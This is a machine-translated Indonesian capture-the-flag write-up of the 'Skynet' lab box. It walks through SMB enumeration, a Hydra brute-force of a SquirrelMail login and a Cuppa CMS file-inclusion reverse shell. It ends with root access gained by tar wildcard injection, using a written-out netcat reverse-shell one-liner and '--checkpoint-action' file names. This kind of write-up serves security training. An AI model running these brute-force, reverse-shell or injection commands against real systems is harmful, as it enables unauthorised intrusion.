---
title: "Skynet"
description: "Enum Nmap : Port 139 & 445 SMB Nmap : Output Nmap : dari sini kita tahu bahwa kita mendapatkan akses anonim pada share smb, mari kita cari tahu apa yang dapat kita temukan di dalam share tersebut. kita"
lang: "id"
translationKey: "skynet"
category: "lab-writeups"
tags: ["Lab", "RFI Exploit", "Cuppa CMS", "Cronjobs-tar *", "Linux"]
publishDate: "2024-12-18"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1605fca1-ed80-80f1-9bfb-c66509efdb39"
notionUrl: "https://app.notion.com/p/Skynet-1605fca1ed8080f19bfbc66509efdb39"
notionLastEdited: "2025-02-12T14:20:00.000Z"
---

# Enum

Nmap:

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA SASL PIPELINING AUTH-RESP-CODE UIDL RESP-CODES TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK IMAP4rev1 SASL-IR ID ENABLE capabilities more IDLE have LOGIN-REFERRALS post-login listed LOGINDISABLEDA0001 Pre-login LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 2h00m02s, deviation: 3h27m51s, median: 1s
| smb2-time: 
|   date: 2024-12-18T15:28:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-12-18T09:28:58-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Port 139 & 445 (SMB)

Nmap:

```bash
nmap --script smb-* -p139,445 10.10.159.216
```

Output Nmap:

```bash
Host script results:
| smb-brute: 
|_  No accounts found
| smb-mbenum: 
|   DFS Root
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Master Browser
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Print server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Server service
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Unix server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Workstation
|_    SKYNET  0.0  skynet server (Samba, Ubuntu)
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-print-text: false
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-12-18T09:42:19-06:00
| smb-ls: Volume \\10.10.159.216\anonymous
| SIZE   TIME                 FILENAME
| <DIR>  2020-11-26T16:04:00  .
| <DIR>  2019-09-17T07:20:17  ..
| 163    2019-09-18T03:04:59  attention.txt
| <DIR>  2019-09-18T04:42:16  logs
| 0      2019-09-18T04:42:13  logs\log2.txt
| 471    2019-09-18T04:41:59  logs\log1.txt
| 0      2019-09-18T04:42:16  logs\log3.txt
|_
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-enum-users: 
|   SKYNET\milesdyson (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
| smb-enum-sessions: 
|_  <nobody>
|_smb-vuln-ms10-061: false
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.159.216\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.159.216\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.159.216\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.159.216\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-domains: 
|   SKYNET
|     Groups: n/a
|     Users: milesdyson
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
|_smb-vuln-ms10-054: false
|_smb-flood: ERROR: Script execution failed (use -d to debug)
```

Dari sini kita tahu bahwa kita mendapatkan akses anonim ke share SMB, mari kita cari tahu apa yang dapat kita temukan di dalam share tersebut.

![](/images/skynet/275c6635c8f6.png)

Kami sudah mendapatkan semua berkasnya dan ada 2 berkas yang berisi hal-hal menarik.

**attention.txt**

> Kerusakan sistem baru-baru ini menyebabkan berbagai kata sandi diubah. Semua karyawan Skynet diharuskan mengubah kata sandi mereka setelah melihat ini.
-Miles Dyson

**log1.txt**

```bash
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

## Pelabuhan 80

![](/images/skynet/f0bb6dac707e.png)

Dirsearch :

![](/images/skynet/72f2a8992d4e.png)

hanya halaman `squirrelmail` yang dapat diakses.

![](/images/skynet/0065cc80bc23.png)

Melakukan serangan brute force pada halaman login SquirrelMail menggunakan Hydra.

```bash
hydra -l milesdyson -P log1.txt 10.10.126.168 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

![](/images/skynet/25255ab583b2.png)

sekarang kita punya kredensial baru `milesdyson : cyborg007haloterminator` mari kita masuk

![](/images/skynet/3603f0922e20.png)

Kami melihat email menarik yang berisi pengaturan ulang kata sandi `)s{A&2Z=F^n_E.B``

![](/images/skynet/23a54fff52ee.png)

mari kita gunakan untuk login SMB sebagai milesdyson

![](/images/skynet/6d64f4dd253f.png)

Setelah masuk ke SMB sebagai miledyson, kami mendapatkan file .txt yang menarik yang berisi

![](/images/skynet/0a68a0cbd793.png)

Mari kita coba mengakses halaman itu.

![](/images/skynet/8cc84b6133d0.png)

Oke, kita hanya mendapatkan halaman statis. Untuk pengecekan lebih lanjut, mari kita lakukan pencarian direktori dengan dirsearch.

![](/images/skynet/5009a6eaa2f5.png)

Sekarang mari kita buka halaman administrator untuk pengecekan lebih lanjut.

![](/images/skynet/c18e6c0f0087.png)

Kami mencoba melakukan serangan brute force menggunakan Hydra tetapi gagal, jadi mari kita cari cara lain untuk mengeksploitasi CMS ini. Berdasarkan SearchSploit, kami menemukan exploit publik.

![](/images/skynet/2482f96bcac1.png)

![](/images/skynet/8e1a8c0af39f.png)

### Manfaatkan Cuppa CMS

Karena kita sekarang dapat melakukan Remote File Inclusion menggunakan exploit publik, kita mencoba menyertakan file .PHP berbahaya dari lokal kita untuk membangun revshell dengan mengakses target URL seperti yang dijelaskan oleh exploit publik.

![](/images/skynet/9e476385647a.png)

Revshell didirikan

![](/images/skynet/83c87b000166.png)

### Kirim flag user.txt

![](/images/skynet/eeff34523679.png)

# Linpriv

kacang polong merambat:

Pada cronjob, kami menemukan sesuatu yang menarik.

![](/images/skynet/f0a21441cc13.png)

dan kita melihat isi dari backup.sh

![](/images/skynet/776f9c1cd3d5.png)

File tersebut dicadangkan menggunakan tar tetapi menggunakan tanda *, sehingga kita dapat menyalahgunakannya untuk meningkatkan hak akses.

Referensi : [https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com)

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 14446 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

![](/images/skynet/927d355b5631.png)

### Kirim flag root.txt

![](/images/skynet/63e031912324.png)
